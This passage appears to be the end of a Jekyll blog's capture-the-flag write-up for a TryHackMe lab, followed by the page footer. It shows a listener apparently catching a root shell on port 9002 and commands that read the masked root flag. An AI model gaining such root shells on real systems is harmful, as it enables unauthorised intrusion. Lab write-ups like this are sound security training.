listening on <span class="o">[</span>any] 9002 ...
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cd /root</span>
<span class="c"># ls</span>
root.txt
<span class="c"># cat root.txt</span>
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The root flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>

    
</div>


        </div>
    </main><footer class="site-footer">
    <div class="wrapper">
        <div class="credits">
            <a href="https://github.com/bitbrain/jekyll-dash" target="_blank">dash</a> theme for Jekyll by <a
                href="https://github.com/bitbrain" target="_blank">bitbrain</a> made with <i class="fas fa-heart"></i>
        </div>
    </div>
</footer><script>
        window.FontAwesomeConfig = {
            searchPseudoElements: true
        }
        $(document).ready(function () {
            $('.post-image').magnificPopup({
                type: 'image',
                callbacks: {
                    elementParse: function (item) {
                        item.src = item.el.attr('src');
                    }
                }
            });
        });
    </script>
</body>

</html>